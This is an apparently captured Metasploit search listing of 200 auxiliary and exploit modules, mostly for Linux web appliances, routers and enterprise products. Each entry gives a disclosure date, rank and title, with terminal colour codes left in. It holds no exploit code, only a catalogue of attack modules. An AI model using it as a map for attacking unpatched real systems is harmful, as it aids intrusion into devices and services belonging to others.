+   0    auxiliary/admin/hp/hp_data_protector_cmd                                  2011-02-07       normal     No     HP Data Protector 6.1 EXEC_CMD Command Execution
+   1    auxiliary/admin/http/jboss_seam_exec                                      2010-07-19       normal     No     JBoss Seam 2 Remote Command Execution
+   2    auxiliary/admin/http/manageengine_dir_listing                             2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary Directory Listing
+   3    auxiliary/admin/http/manageengine_file_download                           2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary File Download
+   4    auxiliary/admin/http/manageengine_pmp_privesc                             2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   5    auxiliary/admin/http/netflow_file_download                                2014-11-30       normal     No     ManageEngine NetFlow Analyzer Arbitrary File Download
+   6    auxiliary/admin/http/netgear_r6700_pass_reset                             2020-06-15       normal     Yes    Netgear R6700v3 Unauthenticated LAN Admin Password Reset
+   7    auxiliary/admin/http/netgear_soap_password_extractor                      2015-02-11       normal     No     Netgear Unauthenticated SOAP Password Extractor
+   8    auxiliary/admin/http/sysaid_admin_acct                                    2015-06-03       normal     No     SysAid Help Desk Administrator Account Creation
+   9    auxiliary/admin/http/sysaid_file_download                                 2015-06-03       normal     No     SysAid Help Desk Arbitrary File Download
+   10   auxiliary/admin/http/sysaid_sql_creds                                     2015-06-03       normal     No     SysAid Help Desk Database Credentials Disclosure
+   11   auxiliary/admin/http/webnms_cred_disclosure                               2016-07-04       normal     No     WebNMS Framework Server Credential Disclosure
+   12   auxiliary/admin/http/webnms_file_download                                 2016-07-04       normal     No     WebNMS Framework Server Arbitrary Text File Download
+   13   auxiliary/admin/networking/cisco_dcnm_download                            2019-06-26       normal     No     Cisco Data Center Network Manager Unauthenticated File Download
+   14   auxiliary/admin/teradata/teradata_odbc_sql                                2018-03-29       normal     No     Teradata ODBC SQL Query Module
+   15   auxiliary/analyze/crack_[45mlinux[0m                                                              normal     No     Password Cracker: [45mLinux[0m
+   16   auxiliary/dos/freebsd/nfsd/nfsd_mount                                                      normal     No     FreeBSD Remote NFS RPC Request Denial of Service
+   17   auxiliary/dos/pptp/ms02_063_pptp_dos                                      2002-09-26       normal     No     MS02-063 PPTP Malformed Control Data [45mKernel[0m Denial of Service
+   18   auxiliary/dos/windows/browser/ms09_065_eot_integer                        2009-11-10       normal     No     Microsoft Windows EOT Font Table Directory Integer Overflow
+   19   auxiliary/dos/windows/smb/ms06_035_mailslot                               2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
+   20   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                                     normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote [45mKernel[0m NULL Pointer Dereference
+   21   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                                 normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
+   22   auxiliary/dos/windows/smb/ms11_019_electbowser                                             normal     No     Microsoft Windows Browser Pool DoS
+   23   auxiliary/gather/firefox_pdfjs_file_theft                                                  normal     No     Firefox PDF.js Browser File Theft
+   24   auxiliary/gather/pulse_secure_file_disclosure                             2019-04-24       normal     No     Pulse Secure VPN Arbitrary File Disclosure
+   25   auxiliary/gather/vbulletin_getindexablecontent_sqli                       2020-03-12       normal     No     vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection
+   26   auxiliary/scanner/http/atlassian_crowd_fileaccess                                          normal     No     Atlassian Crowd XML Entity Expansion Remote File Access
+   27   auxiliary/scanner/http/hp_sitescope_getfileinternal_fileaccess                             normal     No     HP SiteScope SOAP Call getFileInternal Remote File Access
+   28   auxiliary/scanner/http/hp_sitescope_getsitescopeconfiguration                              normal     No     HP SiteScope SOAP Call getSiteScopeConfiguration Configuration Access
+   29   auxiliary/scanner/http/hp_sitescope_loadfilecontent_fileaccess                             normal     No     HP SiteScope SOAP Call loadFileContent Remote File Access
+   30   auxiliary/scanner/http/smt_ipmi_49152_exposure                            2014-06-19       normal     No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
+   31   auxiliary/scanner/http/splunk_web_login                                                    normal     No     Splunk Web Interface Login Utility
+   32   auxiliary/scanner/http/surgenews_user_creds                               2017-06-16       normal     Yes    SurgeNews User Credentials
+   33   auxiliary/scanner/msf/msf_rpc_login                                                        normal     No     Metasploit RPC Interface Login Utility
+   34   auxiliary/scanner/msf/msf_web_login                                                        normal     No     Metasploit Web Interface Login Utility
+   35   auxiliary/scanner/nessus/nessus_ntp_login                                                  normal     No     Nessus NTP Login Utility
+   36   auxiliary/scanner/nessus/nessus_xmlrpc_login                                               normal     No     Nessus XMLRPC Interface Login Utility
+   37   auxiliary/scanner/nessus/nessus_xmlrpc_ping                                                normal     No     Nessus XMLRPC Interface Ping Utility
+   38   auxiliary/scanner/nexpose/nexpose_api_login                                                normal     No     NeXpose API Interface Login Utility
+   39   auxiliary/scanner/openvas/openvas_gsad_login                                               normal     No     OpenVAS gsad Web Interface Login Utility
+   40   auxiliary/scanner/openvas/openvas_omp_login                                                normal     No     OpenVAS OMP Login Utility
+   41   auxiliary/scanner/openvas/openvas_otp_login                                                normal     No     OpenVAS OTP Login Utility
+   42   auxiliary/scanner/teradata/teradata_odbc_login                            2018-03-30       normal     No     Teradata ODBC Login Scanner Module
+   43   auxiliary/scanner/vmware/vmware_server_dir_trav                                            normal     No     VMware Server Directory Traversal Vulnerability
+   44   auxiliary/server/pxeexploit                                                                normal     No     PXE Boot Exploit Server
+   45   exploit/android/browser/stagefright_mp4_tx3g_64bit                        2015-08-13       normal     No     Android Stagefright MP4 tx3g Integer Overflow
+   46   exploit/android/local/binder_uaf                                          2019-09-26       [32mexcellent[0m  No     Android Binder Use-After-Free Exploit
+   47   exploit/android/local/futex_requeue                                       2014-05-03       [32mexcellent[0m  Yes    Android 'Towelroot' Futex Requeue [45mKernel[0m Exploit
+   48   exploit/android/local/put_user_vroot                                      2013-09-06       [32mexcellent[0m  No     Android get_user/put_user Exploit
+   49   exploit/apple_ios/browser/webkit_createthis                               2018-03-15       manual     No     Safari Webkit Proxy Object Type Confusion
+   50   exploit/apple_ios/browser/webkit_trident                                  2016-08-25       manual     No     WebKit not_number defineProperties UAF
+   51   exploit/freebsd/local/intel_sysret_priv_esc                               2012-06-12       [32mgreat[0m      Yes    FreeBSD Intel SYSRET Privilege Escalation
+   52   exploit/freebsd/samba/trans2open                                          2003-04-07       [32mgreat[0m      No     Samba trans2open Overflow (*BSD x86)
+   53   exploit/[45mlinux[0m/antivirus/escan_password_exec                               2014-04-04       [32mexcellent[0m  Yes    eScan Web Management Console Command Injection
+   54   exploit/[45mlinux[0m/browser/adobe_flashplayer_aslaunch                          2008-12-17       good       No     Adobe Flash Player ActionScript Launch Command Execution Vulnerability
+   55   exploit/[45mlinux[0m/ftp/proftp_sreplace                                         2006-11-26       [32mgreat[0m      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow ([45mLinux[0m)
+   56   exploit/[45mlinux[0m/ftp/proftp_telnet_iac                                       2010-11-01       [32mgreat[0m      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow ([45mLinux[0m)
+   57   exploit/[45mlinux[0m/games/ut2004_secure                                         2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow ([45mLinux[0m)
+   58   exploit/[45mlinux[0m/http/accellion_fta_getstatus_oauth                          2015-07-10       [32mexcellent[0m  Yes    Accellion FTA getStatus verify_oauth_token Command Execution
+   59   exploit/[45mlinux[0m/http/advantech_switch_bash_env_exec                         2015-12-01       [32mexcellent[0m  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
+   60   exploit/[45mlinux[0m/http/airties_login_cgi_bof                                  2015-03-31       normal     Yes    Airties login-cgi Buffer Overflow
+   61   exploit/[45mlinux[0m/http/alcatel_omnipcx_mastercgi_exec                         2007-09-09       manual     No     Alcatel-Lucent OmniPCX Enterprise masterCGI Arbitrary Command Execution
+   62   exploit/[45mlinux[0m/http/alienvault_exec                                        2017-01-31       [32mexcellent[0m  Yes    AlienVault OSSIM/USM Remote Code Execution
+   63   exploit/[45mlinux[0m/http/alienvault_sqli_exec                                   2014-04-24       [32mexcellent[0m  Yes    AlienVault OSSIM SQL Injection and Remote Code Execution
+   64   exploit/[45mlinux[0m/http/apache_continuum_cmd_exec                              2016-04-06       [32mexcellent[0m  Yes    Apache Continuum Arbitrary Command Execution
+   65   exploit/[45mlinux[0m/http/apache_couchdb_cmd_exec                                2016-04-06       [32mexcellent[0m  Yes    Apache CouchDB Arbitrary Command Execution
+   66   exploit/[45mlinux[0m/http/astium_sqli_upload                                     2013-09-17       manual     Yes    Astium Remote Code Execution
+   67   exploit/[45mlinux[0m/http/asuswrt_lan_rce                                        2018-01-22       [32mexcellent[0m  No     AsusWRT LAN Unauthenticated Remote Code Execution
+   68   exploit/[45mlinux[0m/http/atutor_filemanager_traversal                           2016-03-01       [32mexcellent[0m  Yes    ATutor 2.2.1 Directory Traversal / Remote Code Execution
+   69   exploit/[45mlinux[0m/http/axis_srv_parhand_rce                                   2018-06-18       [32mexcellent[0m  Yes    Axis Network Camera .srv to parhand RCE
+   70   exploit/[45mlinux[0m/http/belkin_login_bof                                       2014-05-09       normal     Yes    Belkin Play N750 login.cgi Buffer Overflow
+   71   exploit/[45mlinux[0m/http/bludit_upload_images_exec                              2019-09-07       [32mexcellent[0m  Yes    Bludit Directory Traversal Image File Upload Vulnerability
+   72   exploit/[45mlinux[0m/http/cayin_cms_ntp                                          2020-06-04       [32mexcellent[0m  Yes    Cayin CMS NTP Server RCE
+   73   exploit/[45mlinux[0m/http/centreon_pollers_auth_rce                              2020-01-27       [32mexcellent[0m  No     Centreon Poller Authenticated Remote Command Execution
+   74   exploit/[45mlinux[0m/http/centreon_sqli_exec                                     2014-10-15       [32mexcellent[0m  Yes    Centreon SQL and Command Injection
+   75   exploit/[45mlinux[0m/http/centreon_useralias_exec                                2016-02-26       [32mexcellent[0m  Yes    Centreon Web Useralias Command Execution
+   76   exploit/[45mlinux[0m/http/cfme_manageiq_evm_upload_exec                          2013-09-04       [32mexcellent[0m  Yes    Red Hat CloudForms Management Engine 5.1 agent/[45mlinux[0mpkgs Path Traversal
+   77   exploit/[45mlinux[0m/http/cisco_firepower_useradd                                2016-10-10       [32mexcellent[0m  Yes    Cisco Firepower Management Console 6.0 Post Authentication UserAdd Vulnerability
+   78   exploit/[45mlinux[0m/http/cisco_prime_inf_rce                                    2018-10-04       [32mexcellent[0m  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   79   exploit/[45mlinux[0m/http/cisco_rv32x_rce                                        2018-09-09       normal     Yes    Cisco RV320 and RV325 Unauthenticated Remote Code Execution
+   80   exploit/[45mlinux[0m/http/cisco_ucs_cloupia_script_rce                           2020-04-15       [32mexcellent[0m  Yes    Cisco UCS Director Cloupia Script RCE
+   81   exploit/[45mlinux[0m/http/cisco_ucs_rce                                          2019-08-21       [32mexcellent[0m  Yes    Cisco UCS Director Unauthenticated Remote Code Execution
+   82   exploit/[45mlinux[0m/http/citrix_dir_traversal_rce                               2019-12-17       [32mexcellent[0m  Yes    Citrix ADC (NetScaler) Directory Traversal RCE
+   83   exploit/[45mlinux[0m/http/cpi_tararchive_upload                                  2019-05-15       [32mexcellent[0m  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   84   exploit/[45mlinux[0m/http/crypttech_cryptolog_login_exec                         2017-05-03       [32mexcellent[0m  Yes    Crypttech CryptoLog Remote Code Execution
+   85   exploit/[45mlinux[0m/http/cve_2019_1663_cisco_rmi_rce                            2019-02-27       good       Yes    Cisco RV110W/RV130(W)/RV215W Routers Management Interface Remote Command Execution
+   86   exploit/[45mlinux[0m/http/dcos_marathon                                          2017-03-03       [32mexcellent[0m  Yes    DC/OS Marathon UI Docker Exploit
+   87   exploit/[45mlinux[0m/http/ddwrt_cgibin_exec                                      2009-07-20       [32mexcellent[0m  No     DD-WRT HTTP Daemon Arbitrary Command Execution
+   88   exploit/[45mlinux[0m/http/denyall_waf_exec                                       2017-09-19       [32mexcellent[0m  Yes    DenyAll Web Application Firewall Remote Code Execution
+   89   exploit/[45mlinux[0m/http/dlink_authentication_cgi_bof                           2013-02-08       normal     Yes    D-Link authentication.cgi Buffer Overflow
+   90   exploit/[45mlinux[0m/http/dlink_command_php_exec_noauth                          2013-02-04       [32mexcellent[0m  No     D-Link Devices Unauthenticated Remote Command Execution
+   91   exploit/[45mlinux[0m/http/dlink_dcs931l_upload                                   2015-02-23       [32mgreat[0m      Yes    D-Link DCS-931L File Upload
+   92   exploit/[45mlinux[0m/http/dlink_dcs_930l_authenticated_remote_command_execution  2015-12-20       [32mexcellent[0m  No     D-Link DCS-930L Authenticated Remote Command Execution
+   93   exploit/[45mlinux[0m/http/dlink_diagnostic_exec_noauth                           2013-03-05       [32mexcellent[0m  No     D-Link DIR-645 / DIR-815 diagnostic.php Command Execution
+   94   exploit/[45mlinux[0m/http/dlink_dir300_exec_telnet                               2013-04-22       [32mexcellent[0m  No     D-Link Devices Unauthenticated Remote Command Execution
+   95   exploit/[45mlinux[0m/http/dlink_dir605l_captcha_bof                              2012-10-08       manual     Yes    D-Link DIR-605L Captcha Handling Buffer Overflow
+   96   exploit/[45mlinux[0m/http/dlink_dir615_up_exec                                   2013-02-07       [32mexcellent[0m  No     D-Link DIR615h OS Command Injection
+   97   exploit/[45mlinux[0m/http/dlink_dir850l_unauth_exec                              2017-08-09       [32mexcellent[0m  Yes    DIR-850L (Un)authenticated OS Command Exec
+   98   exploit/[45mlinux[0m/http/dlink_dsl2750b_exec_noauth                             2016-02-05       [32mgreat[0m      Yes    D-Link DSL-2750B OS Command Injection
+   99   exploit/[45mlinux[0m/http/dlink_dspw110_cookie_noauth_exec                       2015-06-12       normal     Yes    D-Link Cookie Command Execution
+   100  exploit/[45mlinux[0m/http/dlink_dspw215_info_cgi_bof                             2014-05-22       normal     Yes    D-Link info.cgi POST Request Buffer Overflow
+   101  exploit/[45mlinux[0m/http/dlink_dwl_2600_command_injection                       2019-05-15       [32mexcellent[0m  No     DLINK DWL-2600 Authenticated Remote Command Injection
+   102  exploit/[45mlinux[0m/http/dlink_hedwig_cgi_bof                                   2013-02-08       normal     Yes    D-Link hedwig.cgi Buffer Overflow in Cookie Header
+   103  exploit/[45mlinux[0m/http/dlink_hnap_bof                                         2014-05-15       normal     Yes    D-Link HNAP Request Remote Buffer Overflow
+   104  exploit/[45mlinux[0m/http/dlink_hnap_header_exec_noauth                          2015-02-13       normal     Yes    D-Link Devices HNAP SOAPAction-Header Command Execution
+   105  exploit/[45mlinux[0m/http/dlink_hnap_login_bof                                   2016-11-07       [32mexcellent[0m  Yes    Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow
+   106  exploit/[45mlinux[0m/http/dlink_upnp_exec_noauth                                 2013-07-05       normal     Yes    D-Link Devices UPnP SOAP Command Execution
+   107  exploit/[45mlinux[0m/http/dnalims_admin_exec                                     2017-03-08       [32mexcellent[0m  Yes    dnaLIMS Admin Module Command Execution
+   108  exploit/[45mlinux[0m/http/docker_daemon_tcp                                      2017-07-25       [32mexcellent[0m  Yes    Docker Daemon - Unprotected TCP Socket Exploit
+   109  exploit/[45mlinux[0m/http/dolibarr_cmd_exec                                      2012-04-06       [32mexcellent[0m  Yes    Dolibarr ERP/CRM Post-Auth OS Command Injection
+   110  exploit/[45mlinux[0m/http/dreambox_openpli_shell                                 2013-02-08       [32mgreat[0m      No     OpenPLI Webif Arbitrary Command Execution
+   111  exploit/[45mlinux[0m/http/efw_chpasswd_exec                                      2015-06-28       [32mexcellent[0m  No     Endian Firewall Proxy Password Change Command Injection
+   112  exploit/[45mlinux[0m/http/empire_skywalker                                       2016-10-15       [32mexcellent[0m  Yes    PowerShellEmpire Arbitrary File Upload (Skywalker)
+   113  exploit/[45mlinux[0m/http/esva_exec                                              2012-08-16       [32mexcellent[0m  Yes    E-Mail Security Virtual Appliance learn-msg.cgi Command Injection
+   114  exploit/[45mlinux[0m/http/eyesofnetwork_autodiscovery_rce                        2020-02-06       [32mexcellent[0m  Yes    EyesOfNetwork 5.1-5.3 AutoDiscovery Target Command Execution
+   115  exploit/[45mlinux[0m/http/f5_bigip_tmui_rce                                      2020-06-30       [32mexcellent[0m  Yes    F5 BIG-IP TMUI Directory Traversal and File Upload RCE
+   116  exploit/[45mlinux[0m/http/f5_icall_cmd                                           2015-09-03       [32mexcellent[0m  Yes    F5 iControl iCall::Script Root Command Execution
+   117  exploit/[45mlinux[0m/http/f5_icontrol_exec                                       2013-09-17       [32mexcellent[0m  Yes    F5 iControl Remote Root Command Execution
+   118  exploit/[45mlinux[0m/http/foreman_openstack_satellite_code_exec                  2013-06-06       [32mexcellent[0m  No     Foreman (Red Hat OpenStack/Satellite) bookmarks/create Code Injection
+   119  exploit/[45mlinux[0m/http/fritzbox_echo_exec                                     2014-02-11       [32mexcellent[0m  Yes    Fritz!Box Webcm Unauthenticated Command Injection
+   120  exploit/[45mlinux[0m/http/github_enterprise_secret                               2017-03-15       [32mexcellent[0m  Yes    Github Enterprise Default Session Secret And Deserialization Vulnerability
+   121  exploit/[45mlinux[0m/http/gitlist_exec                                           2014-06-30       [32mexcellent[0m  Yes    Gitlist Unauthenticated Remote Command Execution
+   122  exploit/[45mlinux[0m/http/goahead_ldpreload                                      2017-12-18       [32mexcellent[0m  Yes    GoAhead Web Server LD_PRELOAD Arbitrary Module Load
+   123  exploit/[45mlinux[0m/http/goautodial_3_rce_command_injection                     2015-04-21       [32mexcellent[0m  Yes    GoAutoDial 3.3 Authentication Bypass / Command Injection
+   124  exploit/[45mlinux[0m/http/gpsd_format_string                                     2005-05-25       average    No     Berlios GPSD Format String Vulnerability
+   125  exploit/[45mlinux[0m/http/groundwork_monarch_cmd_exec                            2013-03-08       [32mexcellent[0m  Yes    GroundWork monarch_scan.cgi OS Command Injection
+   126  exploit/[45mlinux[0m/http/hadoop_unauth_exec                                     2016-10-19       [32mexcellent[0m  Yes    Hadoop YARN ResourceManager Unauthenticated Command Execution
+   127  exploit/[45mlinux[0m/http/hp_system_management                                   2012-09-01       normal     Yes    HP System Management Anonymous Access Code Execution
+   128  exploit/[45mlinux[0m/http/hp_van_sdn_cmd_inject                                  2018-06-25       [32mexcellent[0m  Yes    HP VAN SDN Controller Root Command Injection
+   129  exploit/[45mlinux[0m/http/huawei_hg532n_cmdinject                                2017-04-15       [32mexcellent[0m  Yes    Huawei HG532n Command Injection
+   130  exploit/[45mlinux[0m/http/ibm_drm_rce                                            2020-04-21       [32mexcellent[0m  Yes    IBM Data Risk Manager Unauthenticated Remote Code Execution
+   131  exploit/[45mlinux[0m/http/ibm_qradar_unauth_rce                                  2018-05-28       [32mexcellent[0m  Yes    IBM QRadar SIEM Unauthenticated Remote Code Execution
+   132  exploit/[45mlinux[0m/http/imperva_securesphere_exec                              2018-10-08       [32mexcellent[0m  Yes    Imperva SecureSphere PWS Command Injection
+   133  exploit/[45mlinux[0m/http/ipfire_bashbug_exec                                    2014-09-29       [32mexcellent[0m  Yes    IPFire Bash Environment Variable Injection (Shellshock)
+   134  exploit/[45mlinux[0m/http/ipfire_oinkcode_exec                                   2017-06-09       [32mexcellent[0m  Yes    IPFire proxy.cgi RCE
+   135  exploit/[45mlinux[0m/http/ipfire_proxy_exec                                      2016-05-04       [32mexcellent[0m  Yes    IPFire proxy.cgi RCE
+   136  exploit/[45mlinux[0m/http/kaltura_unserialize_cookie_rce                         2017-09-12       [32mexcellent[0m  Yes    Kaltura Remote PHP Code Execution over Cookie
+   137  exploit/[45mlinux[0m/http/kaltura_unserialize_rce                                2016-03-15       [32mexcellent[0m  Yes    Kaltura Remote PHP Code Execution
+   138  exploit/[45mlinux[0m/http/kloxo_sqli                                             2014-01-28       manual     Yes    Kloxo SQL Injection and Remote Code Execution
+   139  exploit/[45mlinux[0m/http/librenms_addhost_cmd_inject                            2018-12-16       [32mexcellent[0m  No     LibreNMS addhost Command Injection
+   140  exploit/[45mlinux[0m/http/librenms_collectd_cmd_inject                           2019-07-15       [32mexcellent[0m  Yes    LibreNMS Collectd Command Injection
+   141  exploit/[45mlinux[0m/http/lifesize_uvc_ping_rce                                  2014-03-21       [32mexcellent[0m  No     LifeSize UVC Authenticated RCE via Ping
+   142  exploit/[45mlinux[0m/http/linksys_apply_cgi                                      2005-09-13       [32mgreat[0m      No     Linksys WRT54 Access Point apply.cgi Buffer Overflow
+   143  exploit/[45mlinux[0m/http/linksys_e1500_apply_exec                               2013-02-05       [32mexcellent[0m  No     Linksys E1500/E2500 apply.cgi Remote Command Injection
+   144  exploit/[45mlinux[0m/http/linksys_themoon_exec                                   2014-02-13       [32mexcellent[0m  Yes    Linksys E-Series TheMoon Remote Command Injection
+   145  exploit/[45mlinux[0m/http/linksys_wrt110_cmd_exec                                2013-07-12       [32mexcellent[0m  Yes    Linksys Devices pingstr Remote Command Injection
+   146  exploit/[45mlinux[0m/http/linksys_wrt160nv2_apply_exec                           2013-02-11       [32mexcellent[0m  No     Linksys WRT160nv2 apply.cgi Remote Command Injection
+   147  exploit/[45mlinux[0m/http/linksys_wrt54gl_apply_exec                             2013-01-18       manual     No     Linksys WRT54GL apply.cgi Command Execution
+   148  exploit/[45mlinux[0m/http/linksys_wvbr0_user_agent_exec_noauth                   2017-12-13       [32mexcellent[0m  Yes    Linksys WVBR0-25 User-Agent Command Execution
+   149  exploit/[45m[45mlinux[0m[0m/http/[45m[45mlinux[0m[0mki_rce                                            2020-05-17       [32mexcellent[0m  Yes    [45mLinux[0mKI Toolset 6.01 Remote Command Execution
+   150  exploit/[45mlinux[0m/http/logsign_exec                                           2017-02-26       [32mexcellent[0m  Yes    Logsign Remote Command Injection
+   151  exploit/[45mlinux[0m/http/mailcleaner_exec                                       2018-12-19       [32mexcellent[0m  No     Mailcleaner Remote Code Execution
+   152  exploit/[45mlinux[0m/http/microfocus_secure_messaging_gateway                    2018-06-19       [32mexcellent[0m  Yes    MicroFocus Secure Messaging Gateway Remote Code Execution
+   153  exploit/[45mlinux[0m/http/multi_ncc_ping_exec                                    2015-02-26       normal     Yes    D-Link/TRENDnet NCC Service Command Injection
+   154  exploit/[45mlinux[0m/http/mutiny_frontend_upload                                 2013-05-15       [32mexcellent[0m  Yes    Mutiny 5 Arbitrary File Upload
+   155  exploit/[45mlinux[0m/http/mvpower_dvr_shell_exec                                 2015-08-23       [32mexcellent[0m  Yes    MVPower DVR Shell Unauthenticated Command Execution
+   156  exploit/[45mlinux[0m/http/nagios_xi_authenticated_rce                            2019-07-29       [32mexcellent[0m  Yes    Nagios XI Authenticated Remote Command Execution
+   157  exploit/[45mlinux[0m/http/nagios_xi_chained_rce                                  2016-03-06       [32mexcellent[0m  Yes    Nagios XI Chained Remote Code Execution
+   158  exploit/[45mlinux[0m/http/nagios_xi_chained_rce_2_electric_boogaloo              2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
+   159  exploit/[45mlinux[0m/http/nagios_xi_magpie_debug                                 2018-11-14       [32mexcellent[0m  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
+   160  exploit/[45mlinux[0m/http/netgear_dgn1000_setup_unauth_exec                      2013-06-05       [32mexcellent[0m  Yes    Netgear DGN1000 Setup.cgi Unauthenticated RCE
+   161  exploit/[45mlinux[0m/http/netgear_dgn1000b_setup_exec                            2013-02-06       [32mexcellent[0m  No     Netgear DGN1000B setup.cgi Remote Command Execution
+   162  exploit/[45mlinux[0m/http/netgear_dgn2200b_pppoe_exec                            2013-02-15       manual     No     Netgear DGN2200B pppoe.cgi Remote Command Execution
+   163  exploit/[45mlinux[0m/http/netgear_dnslookup_cmd_exec                             2017-02-25       [32mexcellent[0m  Yes    Netgear DGN2200 dnslookup.cgi Command Injection
+   164  exploit/[45mlinux[0m/http/netgear_r7000_cgibin_exec                              2016-12-06       [32mexcellent[0m  Yes    Netgear R7000 and R6400 cgi-bin Command Injection
+   165  exploit/[45mlinux[0m/http/netgear_readynas_exec                                  2013-07-12       manual     Yes    NETGEAR ReadyNAS Perl Code Evaluation
+   166  exploit/[45mlinux[0m/http/netgear_unauth_exec                                    2016-02-25       [32mexcellent[0m  Yes    Netgear Devices Unauthenticated Remote Command Execution
+   167  exploit/[45mlinux[0m/http/netgear_wnr2000_rce                                    2016-12-20       [32mexcellent[0m  Yes    NETGEAR WNR2000v5 (Un)authenticated hidden_lang_avi Stack Overflow
+   168  exploit/[45mlinux[0m/http/netsweeper_webadmin_unixlogin                          2020-04-28       [32mexcellent[0m  Yes    Netsweeper WebAdmin unixlogin.php Python Code Injection
+   169  exploit/[45mlinux[0m/http/nexus_repo_manager_el_injection                        2020-03-31       [32mexcellent[0m  Yes    Nexus Repository Manager Java EL Injection RCE
+   170  exploit/[45mlinux[0m/http/nginx_chunked_size                                     2013-05-07       [32mgreat[0m      Yes    Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow
+   171  exploit/[45mlinux[0m/http/nuuo_nvrmini_auth_rce                                  2016-08-04       [32mexcellent[0m  No     NUUO NVRmini 2 / Crystal / NETGEAR ReadyNAS Surveillance Authenticated Remote Code Execution
+   172  exploit/[45mlinux[0m/http/nuuo_nvrmini_unauth_rce                                2016-08-04       [32mexcellent[0m  Yes    NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Unauthenticated Remote Code Execution
+   173  exploit/[45mlinux[0m/http/op5_config_exec                                        2016-04-08       [32mexcellent[0m  Yes    op5 v7.1.9 Configuration Command Execution
+   174  exploit/[45mlinux[0m/http/openfiler_networkcard_exec                             2012-09-04       [32mexcellent[0m  Yes    Openfiler v2.x NetworkCard Command Execution
+   175  exploit/[45mlinux[0m/http/pandora_fms_events_exec                                2020-06-04       [32mexcellent[0m  Yes    Pandora FMS Events Remote Command Execution
+   176  exploit/[45mlinux[0m/http/pandora_fms_exec                                       2014-01-29       [32mexcellent[0m  Yes    Pandora FMS Remote Code Execution
+   177  exploit/[45mlinux[0m/http/pandora_fms_sqli                                       2014-02-01       [32mexcellent[0m  Yes    Pandora FMS Default Credential / SQLi Remote Code Execution
+   178  exploit/[45mlinux[0m/http/pandora_ping_cmd_exec                                  2020-03-09       [32mexcellent[0m  Yes    Pandora FMS Ping Authenticated Remote Code Execution
+   179  exploit/[45mlinux[0m/http/panos_readsessionvars                                  2017-12-11       [32mexcellent[0m  No     Palo Alto Networks readSessionVarsFromFile() Session Corruption
+   180  exploit/[45mlinux[0m/http/peercast_url                                           2006-03-08       average    No     PeerCast URL Handling Buffer Overflow
+   181  exploit/[45mlinux[0m/http/php_imap_open_rce                                      2018-10-23       good       Yes    php imap_open Remote Code Execution
+   182  exploit/[45mlinux[0m/http/pineapp_ldapsyncnow_exec                               2013-07-26       [32mexcellent[0m  Yes    PineApp Mail-SeCure ldapsyncnow.php Arbitrary Command Execution
+   183  exploit/[45mlinux[0m/http/pineapp_livelog_exec                                   2013-07-26       [32mexcellent[0m  Yes    PineApp Mail-SeCure livelog.html Arbitrary Command Execution
+   184  exploit/[45mlinux[0m/http/pineapp_test_li_conn_exec                              2013-07-26       [32mexcellent[0m  Yes    PineApp Mail-SeCure test_li_connection.php Arbitrary Command Execution
+   185  exploit/[45mlinux[0m/http/pineapple_bypass_cmdinject                             2015-08-01       [32mexcellent[0m  Yes    Hak5 WiFi Pineapple Preconfiguration Command Injection
+   186  exploit/[45mlinux[0m/http/pineapple_preconfig_cmdinject                          2015-08-01       [32mexcellent[0m  Yes    Hak5 WiFi Pineapple Preconfiguration Command Injection
+   187  exploit/[45mlinux[0m/http/piranha_passwd_exec                                    2000-04-04       [32mexcellent[0m  No     RedHat Piranha Virtual Server Package passwd.php3 Arbitrary Command Execution
+   188  exploit/[45mlinux[0m/http/pulse_secure_cmd_exec                                  2019-04-24       [32mexcellent[0m  Yes    Pulse Secure VPN Arbitrary Command Execution
+   189  exploit/[45mlinux[0m/http/qnap_qcenter_change_passwd_exec                        2018-07-11       [32mexcellent[0m  Yes    QNAP Q'Center change_passwd Command Execution
+   190  exploit/[45mlinux[0m/http/raidsonic_nas_ib5220_exec_noauth                       2013-02-04       manual     No     Raidsonic NAS Devices Unauthenticated Remote Command Execution
+   191  exploit/[45mlinux[0m/http/railo_cfml_rfi                                         2014-08-26       [32mexcellent[0m  Yes    Railo Remote File Include
+   192  exploit/[45mlinux[0m/http/rancher_server                                         2017-07-27       [32mexcellent[0m  Yes    Rancher Server - Docker Exploit
+   193  exploit/[45mlinux[0m/http/rconfig_ajaxarchivefiles_rce                           2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
+   194  exploit/[45mlinux[0m/http/realtek_miniigd_upnp_exec_noauth                       2015-04-24       normal     Yes    Realtek SDK Miniigd UPnP SOAP Command Execution
+   195  exploit/[45mlinux[0m/http/riverbed_netprofiler_netexpress_exec                   2016-06-27       [32mexcellent[0m  Yes    Riverbed SteelCentral NetProfiler/NetExpress Remote Code Execution
+   196  exploit/[45mlinux[0m/http/samsung_srv_1670d_upload_exec                          2017-03-14       good       Yes    Samsung SRN-1670D Web Viewer Version 1.0.0.193 Arbitrary File Read and Upload
+   197  exploit/[45mlinux[0m/http/seagate_nas_php_exec_noauth                            2015-03-01       normal     Yes    Seagate Business NAS Unauthenticated Remote Command Execution
+   198  exploit/[45mlinux[0m/http/smt_ipmi_close_window_bof                              2013-11-06       good       Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
+   199  exploit/[45mlinux[0m/http/sophos_wpa_iface_exec                                  2014-04-08       [32mexcellent[0m  No     Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution
